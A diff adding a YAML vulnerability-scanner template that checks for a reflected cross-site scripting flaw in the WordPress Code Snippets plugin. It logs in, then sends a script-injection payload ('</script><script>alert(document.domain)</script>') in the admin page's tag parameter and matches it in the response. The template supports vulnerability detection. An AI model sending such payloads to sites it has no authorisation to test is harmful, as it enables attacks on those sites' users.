@@ -1,0 +1,57 @@
+id: wp-code-snippets-xss
+brief:
+    title: WordPress Code Snippets - Cross-Site Scripting
+    by: dhiyaneshDK
+    level: medium
+    about: WordPress Code Snippets plugin contains a cross-site scripting vulnerability. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. Th...
+    label:
+        - wordpress
+        - xss
+        - wp-plugin
+        - authenticated
+        - vuln
+    score: CVSS:5.4
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/wp-login.php'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: wordpress_test_cookie=WP%20Cookie%20check
+        Origin: '{{RootURL}}'
+      body: log={{username}}&pwd={{password}}&wp-submit=Log+In&testcookie=1
+      signs:
+        - "on": word
+          has:
+            - </script><script>alert(document.domain)</script>
+            - toplevel_page_snippets
+            - Search results in tag
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-admin/admin.php?page=snippets&tag=</script><script>alert(document.domain)</script>'
+      signs:
+        - "on": word
+          has:
+            - </script><script>alert(document.domain)</script>
+            - toplevel_page_snippets
+            - Search results in tag
+          in: body
+          need: all
+        - "on": word
+          has:
+            - text/html
+          in: header
+          need: all
+        - "on": status
+          status:
+            - 200
